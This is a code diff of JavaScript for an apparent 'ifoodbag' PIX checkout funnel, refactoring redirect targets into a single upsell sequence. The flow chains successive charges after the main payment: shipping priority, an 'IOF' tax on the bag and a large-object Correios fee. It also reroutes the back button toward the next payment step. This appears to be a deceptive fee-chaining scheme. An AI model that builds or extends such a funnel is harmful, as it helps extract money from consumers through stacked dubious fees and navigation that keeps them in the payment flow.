@@ -114,6 +114,15 @@ const STORAGE_KEYS = {
     pixAutoRetryState: 'ifoodbag.pixAutoRetryState'
 };
 
+// Sequencia unica apos a confirmacao de cada PIX do funil:
+// pagamento principal -> upsell -> IOF -> Correios.
+const UPSELL_FLOW = Object.freeze({
+    afterBasePayment: 'upsell.html',
+    afterUpsellPayment: 'upsell-iof.html',
+    afterIofPayment: 'upsell-correios.html',
+    afterCorreiosPayment: 'upsell-correios.html?paid=1'
+});
+
 const ECONOMICO_SHIPPING_PRICE = 18.86;
 const LEGACY_ECONOMICO_SHIPPING_PRICE = 19.9;
 const DEFAULT_GATEWAY_TEST_AMOUNT = '18,86';
@@ -2559,7 +2568,7 @@ function initUpsellIof() {
 
     const goToSecondUpsell = () => {
         setStage('upsell_correios');
-        redirect('upsell-correios.html');
+        redirect(UPSELL_FLOW.afterIofPayment);
     };
 
     const handleAccept = async (event) => {
@@ -2593,7 +2602,7 @@ function initUpsellIof() {
                     title: 'Taxa de IOF da BAG',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
-                    targetAfterPaid: 'upsell-correios.html'
+                    targetAfterPaid: UPSELL_FLOW.afterIofPayment
                 }
             });
         } catch (error) {
@@ -2739,7 +2748,7 @@ function initUpsellCorreios() {
                     title: 'Taxa de objeto grande dos Correios',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
-                    targetAfterPaid: 'upsell-correios.html?paid=1'
+                    targetAfterPaid: UPSELL_FLOW.afterCorreiosPayment
                 }
             });
         } catch (error) {
@@ -2836,7 +2845,7 @@ function initUpsell() {
 
     if (paidMode) {
         setStage('upsell_iof');
-        redirect('upsell-iof.html');
+        redirect(UPSELL_FLOW.afterUpsellPayment);
         return;
     }
 
@@ -2868,7 +2877,7 @@ function initUpsell() {
                     title: 'Prioridade de envio',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
-                    targetAfterPaid: 'upsell-iof.html'
+                    targetAfterPaid: UPSELL_FLOW.afterUpsellPayment
                 }
             });
         } catch (error) {
@@ -2882,7 +2891,7 @@ function initUpsell() {
         trackLead('upsell_decline', { stage: 'upsell', shipping, pix });
         showToast('Tudo certo. Vamos para a proxima etapa.', 'info');
         setStage('upsell_iof');
-        redirect('upsell-iof.html');
+        redirect(UPSELL_FLOW.afterUpsellPayment);
     });
 }
 
@@ -3510,9 +3519,9 @@ function initPix() {
 
     const resolveUpsellPaidRedirect = () => {
         if (upsellTargetAfterPaid) return upsellTargetAfterPaid;
-        if (isIofUpsellPix) return 'upsell-correios.html';
-        if (isCorreiosUpsellPix) return 'upsell-correios.html?paid=1';
-        return 'upsell-iof.html';
+        if (isIofUpsellPix) return UPSELL_FLOW.afterIofPayment;
+        if (isCorreiosUpsellPix) return UPSELL_FLOW.afterCorreiosPayment;
+        return UPSELL_FLOW.afterUpsellPayment;
     };
 
     const resolveStageFromRedirect = (targetUrl) => {
@@ -3598,7 +3607,7 @@ function initPix() {
         if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Pagamento confirmado';
         setStage('upsell');
         setTimeout(() => {
-            redirect('upsell.html');
+            redirect(UPSELL_FLOW.afterBasePayment);
         }, 900);
     };
 
@@ -3776,7 +3785,7 @@ function resolvePaidPixTarget(pix) {
     if (explicitTarget) return explicitTarget;
 
     const isUpsellPix = Boolean(pixData?.isUpsell || pixData?.upsell?.enabled);
-    if (!isUpsellPix) return 'upsell.html';
+    if (!isUpsellPix) return UPSELL_FLOW.afterBasePayment;
 
     const kind = String(pixData?.upsell?.kind || '').trim().toLowerCase();
     const hints = [
@@ -3784,10 +3793,10 @@ function resolvePaidPixTarget(pix) {
         String(pixData?.shippingName || '').trim().toLowerCase(),
         String(pixData?.upsell?.title || '').trim().toLowerCase()
     ].join(' ');
-    if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell-correios.html';
-    if (/correios|objeto_grande|objeto grande/.test(kind) || /correios|objeto_grande|objeto grande/.test(hints)) return 'upsell-correios.html?paid=1';
+    if (/iof/.test(kind) || /iof/.test(hints)) return UPSELL_FLOW.afterIofPayment;
+    if (/correios|objeto_grande|objeto grande/.test(kind) || /correios|objeto_grande|objeto grande/.test(hints)) return UPSELL_FLOW.afterCorreiosPayment;
 
-    return 'upsell-iof.html';
+    return UPSELL_FLOW.afterUpsellPayment;
 }
 
 function buildBackRedirectUrl(pageOverride) {
@@ -3837,7 +3846,7 @@ function buildBackRedirectUrl(pageOverride) {
         return 'pix.html';
     }
     if (pixPaid) {
-        return resolvePaidPixTarget(pix) || 'upsell.html';
+        return resolvePaidPixTarget(pix) || UPSELL_FLOW.afterBasePayment;
     }
 
     switch (page) {
@@ -3864,7 +3873,7 @@ function buildBackRedirectUrl(pageOverride) {
         case 'pix':
             return pixPending ? 'pix.html' : directCheckoutUrl();
         case 'upsell-iof':
-            return 'upsell-iof.html';
+            return UPSELL_FLOW.afterUpsellPayment;
         case 'upsell-correios':
             return 'upsell-correios.html';
         case 'upsell':
